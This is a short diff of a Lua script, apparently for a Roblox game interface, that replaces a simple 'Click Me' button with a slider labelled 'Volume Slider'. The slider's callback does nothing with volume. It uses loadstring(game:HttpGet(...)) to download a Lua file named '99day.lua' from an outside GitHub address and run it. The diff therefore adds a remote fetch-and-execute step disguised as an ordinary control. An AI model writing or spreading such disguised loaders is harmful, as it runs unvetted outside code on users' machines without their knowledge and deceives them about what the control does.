@@ -200,10 +200,15 @@ Tabs.ParagraphTab:Paragraph({
 })
 
 
-Tabs.ButtonTab:Button({
-    Title = "Click Me",
-    Desc = "This is a simple button",
-    Callback = function() print("Button Clicked!") end
+Tabs.SliderTab:Slider({
+    Title = "Volume Slider",
+    Value = {
+        Min = 16,
+        Max = 100,
+        Default = 16,
+    },
+    Callback = function(value) loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/99day.lua"))()
+end
 })
 
 
